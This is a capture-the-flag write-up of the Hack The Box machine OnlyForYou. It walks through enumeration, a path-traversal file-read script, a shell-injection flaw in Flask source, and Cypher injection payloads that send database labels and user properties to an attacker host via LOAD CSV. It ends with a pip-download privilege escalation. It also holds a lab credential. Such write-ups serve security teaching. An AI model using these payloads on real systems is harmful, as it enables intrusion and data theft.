---
title: "ONLYFORYOU HTB MEDIUM"
layout: page
date: 2023-04-24
image: https://miro.medium.com/max/786/0*Wr3Tm8LvmG57ES_2.webp
headerImage: true
tag:
- Hackthebox
- onlyforyou writeup htb
- only4you.htb
- onlyforyou walkthrough
- hasharmujahid
- hashar mujahid
- pip3 download exploitation
star: true
category: blog
author: Hashar Mujahid
description: Hi This Blog is the writeup of Only4you Machine from Hack The Box.
---


![](https://i.imgur.com/o7j5neC.png)

# NETWORK ENUMERATION:

## TCP SCAN:

```bash
 ╭─hax13@ZARB in ~/Documents/ctfs/htb/medium/OnlyForYou-10.10.11.210 took 21ms
 ╰─λ sudo nmap -sC -sV -p- --min-rate 1500 10.10.11.210 -oN nmap/tcp-all.txt
[sudo] password for hax13:       
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-23 07:55 PKT
Nmap scan report for 10.10.11.210
Host is up (0.59s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e883e0a9fd43df38198aaa35438411ec (RSA)
|   256 83f235229b03860c16cfb3fa9f5acd08 (ECDSA)
|_  256 445f7aa377690a77789b04e09f11db80 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://only4you.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 76.35 seconds

```



`only4you.htb`  Add this to our hosts file.


# WEB ENUMERATION:

> Landing Page


![](https://i.imgur.com/vMQS3Mk.png)

This is a simple html page. let's fuzz for virtual hosts.

> VHOSTS

```bash
 ╭─hax13@ZARB in ~/Documents/ctfs/htb/medium/OnlyForYou-10.10.11.210 took 8ms
[🧱] × ffuf -u http://only4you.htb/ -w /opt/wordlist/subdomain-20000.txt -H "HOST:FUZZ.only4you.htb"  -mc all -fw 6 -o ffuf/subs

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://only4you.htb/
 :: Wordlist         : FUZZ: /opt/wordlist/subdomain-20000.txt
 :: Header           : Host: FUZZ.only4you.htb
 :: Output file      : ffuf/subs
 :: File format      : json
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response words: 6
________________________________________________

[Status: 200, Size: 2191, Words: 370, Lines: 52, Duration: 187ms]
    * FUZZ: beta

```

let's add `beta.only4you.htb`  to hosts file.
> beta site


```bash
 ╭─hax13@ZARB in ~/Documents/ctfs/htb/medium/OnlyForYou-10.10.11.210 took 12m53s                                                            
 ╰─λ ffuf -u http://beta.only4you.htb/FUZZ -w /opt/wordlist/directory-list-medium.txt -o ffuf/dirsacn-beta-only4u                           

        /'___\  /'___\           /'___\                                                                                                     
       /\ \__/ /\ \__/  __  __  /\ \__/                                                                                                     
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\                                                                                                    
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/                                                                                                    
         \ \_\   \ \_\  \ \____/  \ \_\                                                                                                     
          \/_/    \/_/   \/___/    \/_/                                                                                                                                              
       v2.0.0-dev                                                                                                                           
________________________________________________                                                                                            
 :: Method           : GET                                                                                                                  
 :: URL              : http://beta.only4you.htb/FUZZ                                                                                        
 :: Wordlist         : FUZZ: /opt/wordlist/directory-list-medium.txt                                                                        
 :: Output file      : ffuf/dirsacn-beta-only4u                                                                                             
 :: File format      : json                                                                                                                 
 :: Follow redirects : false                                                                                                                
 :: Calibration      : false                                                                                                                
 :: Timeout          : 10                                                                                                                   
 :: Threads          : 40                                                                                                                   
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500                                                                 
________________________________________________                                                                                            
[Status: 405, Size: 683, Words: 161, Lines: 37, Duration: 174ms]                                                                            
    * FUZZ: download                                                                                                                        
[Status: 200, Size: 5934, Words: 1979, Lines: 134, Duration: 406ms]                                                                         
    * FUZZ: list                                                                                                                            
[Status: 200, Size: 12127, Words: 42, Lines: 43, Duration: 247ms]                                                                           
    * FUZZ: source                                                                                                                          
[Status: 200, Size: 2760, Words: 498, Lines: 62, Duration: 211ms]                                                                           
    * FUZZ: convert                                                                                                                         
[Status: 200, Size: 2984, Words: 564, Lines: 69, Duration: 259ms]                                                                           
    * FUZZ: resize                                                    
```

![](https://i.imgur.com/mn8rq1S.png)


> UPLOAD FUNCTIONLIY

![](https://i.imgur.com/E6AzhJw.png)

Let's  analyze the source code and see if we can find some thng intresting.

> SOURCE CODE ANALYSIS

![](https://i.imgur.com/pkGTcfW.png)
We can see developer thinks he placed protection against the download functionlaity but this can be bypassed.
Let's send this request using curl.
```
curl -i -s -k -X $'POST' \
    -H $'Host: beta.only4you.htb' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0' -H $'Content-Length: 17' \
    --data-binary $'image=/etc/passwd' \
    $'http://beta.only4you.htb/download'
```

![](https://i.imgur.com/G6cJuid.png)

We can automate this process using python script.
```python
import requests
import sys

url = 'http://beta.only4you.htb/download'
while True:
	file_to_be_retrived = input("[x] ENTER THE FILE NAME: ")
	if file_to_be_retrived!='q' or 'quit':
		req = requests.request('POST', url,data={"image":file_to_be_retrived})
		print(req.text)
	else:
		sys.exit()
```

![](https://i.imgur.com/7GuPe2F.png)

Let's read the source code for `only4you.htb`. Which could be located in `/var/www/only4you.htb/app.py`.

```python
#[x] ENTER THE FILE NAME: /var/www/only4you.htb/app.py
from flask import Flask, render_template, request, flash, redirect
from form import sendmessage # ==> WE CAN SEE THE FORM.pY FILE
import uuid

app = Flask(__name__)
app.secret_key = uuid.uuid4().hex

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        email = request.form['email']
        subject = request.form['subject']
        message = request.form['message']
        ip = request.remote_addr

        status = sendmessage(email, subject, message, ip)
        if status == 0:
            flash('Something went wrong!', 'danger')
        elif status == 1:
            flash('You are not authorized!', 'danger')
        else:
            flash('Your message was successfuly sent! We will reply as soon as possible.', 'success')
        return redirect('/#contact')
    else:
        return render_template('index.html')

@app.errorhandler(404)
def page_not_found(error):
    return render_template('404.html'), 404

@app.errorhandler(500)
def server_errorerror(error):
    return render_template('500.html'), 500

@app.errorhandler(400)
def bad_request(error):
    return render_template('400.html'), 400

@app.errorhandler(405)
def method_not_allowed(error):
    return render_template('405.html'), 405

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=80, debug=False)

```
We can see the form.py file from the import statements.

```python
[x] ENTER THE FILE NAME: /var/www/only4you.htb/form.py                                                                                                                                                                                                                          
import smtplib, re                                                                                                                                                                                                                                                              
from email.message import EmailMessage                                                                                                                                                                                                                                          
from subprocess import PIPE, run                                    
import ipaddress                                                    

def issecure(email, ip):                                            
        if not re.match("([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})", email):                                                                                                                                                                              
                return 0                                            
        else:                                                       
                domain = email.split("@", 1)[1]                                                                                         
                result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)                                                            
                output = result.stdout.decode('utf-8')                                                                                  
                if "v=spf1" not in output:                          
                        return 1                                    
                else:                                               
                        domains = []                                
                        ips = []                                    
                        if "include:" in output:                                                                                        
                                dms = ''.join(re.findall(r"include:.*\.[A-Z|a-z]{2,}", output)).split("include:")                                                                                                                                                               
                                dms.pop(0)                          
                                for domain in dms:                                                                                      
                                        domains.append(domain)                                                                          
                                while True:                         
                                        for domain in domains:                                                                          
                                                result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)                                                                                                                                                                    
                                                output = result.stdout.decode('utf-8')                                                  
                                                if "include:" in output:                                                                
                                                        dms = ''.join(re.findall(r"include:.*\.[A-Z|a-z]{2,}", output)).split("include:")                                                                                                                                       
                                                        domains.clear()                                                                 
                                                        for domain in dms:                                                              
                                                                domains.append(domain)                                                  
                                                elif "ip4:" in output:                                                                  
                                                        ipaddresses = ''.join(re.findall(r"ip4:+[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+[/]?[0-9]{2}", output)).split("ip4:")                                                                                                             
                                                        ipaddresses.pop(0)                                                              
                                                        for i in ipaddresses:                                                           
                                                                ips.append(i)                                                           
                                                else:                                                                                   
                                                        pass                                                                            
                                        break                       
                        elif "ip4" in output:                       
                                ipaddresses = ''.join(re.findall(r"ip4:+[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+[/]?[0-9]{2}", output)).split("ip4:")                                                                                                                                     
                                ipaddresses.pop(0)                                                                                      
                                for i in ipaddresses:                                                                                   
                                        ips.append(i)                                                                                   
                        else:                                       
                                return 1                            
                for i in ips:                                       
                        if ip == i:                                 
                                return 2                            
                        elif ipaddress.ip_address(ip) in ipaddress.ip_network(i):                                                       
                                return 2                            
                        else:                                       
                                return 1                            

def sendmessage(email, subject, message, ip):                       
        status = issecure(email, ip)                                
        if status == 2:                                             
                msg = EmailMessage()                                
                msg['From'] = f'{email}'                            
                msg['To'] = 'info@only4you.htb'                                                                                         
                msg['Subject'] = f'{subject}'                       
                msg['Message'] = f'{message}'                       

                smtp = smtplib.SMTP(host='localhost', port=25)                                                                          
                smtp.send_message(msg)                              
                smtp.quit()                                         
                return status                                       
        elif status == 1:                                           
                return status                                       
        else:                   
```

WE CAN SEE SOME PROBLEMS WITH THE CODE RIGHT AWAY!!!

The problem lies here `result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)`

The parameter domian is being passed to the shell command without any input sanitization.

The main issue with this code is that it is vulnerable to shell injection attacks. This happens because the shell argument is set to True, which means that the command being executed is interpreted by the shell. If the domain variable contains special characters like ; or |, an attacker could inject additional commands into the shell and potentially execute malicious code. To avoid this vulnerability, it's better to use the subprocess module's subprocess.run function with the args argument as a list of arguments instead of a string, and set the shell argument to False. This ensures that the command is executed directly, without being interpreted by the shell.

# FOOTHOLD

**COMMAND EXECUTION POC**:

![](https://i.imgur.com/lfbzeNo.png)

Let's test on the attcker side to see if we have ny ping backs .

![](https://i.imgur.com/1ztmjuZ.png)


Now Let's get  a reverse shell.

![](https://i.imgur.com/Yqh8AcU.png)
On the attacker side shabilize the shell.

![](https://i.imgur.com/UR1k6Xk.png)

Let's run linpeas and see .
![](https://i.imgur.com/AwLXRvE.png)



> PORT 3000

![](https://i.imgur.com/HG6PD6E.png)



> PORT 8001


`\chisel.exe client 10.10.16.4:9999 R:8001:127.0.0.1:8001`

![](https://i.imgur.com/xt998l7.png)

This application is hosted on local host and in development enviorment So after trying some sql injections turns out `admin:admin` is the correct password.
![](https://i.imgur.com/eH7MQLN.png)

We can see neo4j was enabled .
![](https://i.imgur.com/wQeLrJT.png)
on port 7474.

After serching for some exploiting techniques found a haktrikz blog.
[link](https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j)

We can try these injection techniques in the search section of the website.
`http://127.0.0.1:8001/search`

![](https://i.imgur.com/Br9PRge.png)

![](https://i.imgur.com/zYhAb7C.png)
On server side:
![](https://i.imgur.com/muJNsqR.png)
`GET /?version=5.6.0&name=Neo4j Kernel&edition=community HTTP/1.1`

We can see some info about version and name.

Let's get the labels:

`'OR 1=1 WITH 1 as a  CALL db.labels() yield label LOAD CSV FROM 'http://10.10.16.4:5000/?label='+label as l RETURN 0 as _0 //`

![](https://i.imgur.com/Pj1PgHG.png)
Now let's get properties.
`' OR 1=1 WITH 1 as a MATCH (f:Flag) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.16.4:5000/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //`

Just replace the flag with the db label of user.

![](https://i.imgur.com/SESvBFA.png)
![](https://i.imgur.com/GS5rxz3.png)

Now let's try loging in as john.

# PRIVESCJOHN

![](https://i.imgur.com/2NuiU3H.png)


From the password above we are logged in as john.

# **PRIVESC ROOT:**

Let's run sudo -l
![](https://i.imgur.com/IwcZcvH.png)

Here Pip is used to download the  repos stored in GOGS SERVER SO LET's access that.
![](https://i.imgur.com/qlNk8Hf.png)

We can login to GOGs as a `john:ThisIs4You` . 
![](https://i.imgur.com/pfg1GGd.png)

Let's search for some exploitation techniques.
![](https://i.imgur.com/Xnzro8p.png)
[LINK](https://embracethered.com/blog/posts/2022/python-package-manager-install-and-download-vulnerability/)

let's follow the steps and clone his repo.
after that modify the code.
![](https://i.imgur.com/5h6KP5h.png)


Build this packege and transfer it to a new directory  where we will create a new  git repo.
![](https://i.imgur.com/bfPpfNa.png)

Now make a new git repo and this .
![](https://i.imgur.com/xMi1gPv.png)

![](https://i.imgur.com/9fIMRB0.png)

Cpoy the raw url and run the sudo command.
![](https://i.imgur.com/jBGdFJO.png)

Now we have suid bit on /bin/bash
![](https://i.imgur.com/tI0SzOZ.png)


WE ARE ROOT.




